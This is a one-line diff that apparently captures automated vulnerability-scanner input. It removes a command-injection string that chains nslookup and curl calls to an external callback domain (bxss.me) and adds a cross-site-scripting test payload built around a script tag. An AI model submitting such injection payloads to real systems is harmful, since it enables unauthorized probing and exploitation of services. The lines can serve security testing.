@@ -1,1 +1,1 @@
-;(nslookup -q=cname hitxmylbatlwoa209f.bxss.me||curl hitxmylbatlwoa209f.bxss.me)|(nslookup -q=cname hitxmylbatlwoa209f.bxss.me||curl hitxmylbatlwoa209f.bxss.me)&(nslookup -q=cname hitxmylbatlwoa209f.bxss.me||curl hitxmylbatlwoa209f.bxss.me)
+'"()&%<zzz><ScRiPt >PZLL(9307)</ScRiPt>
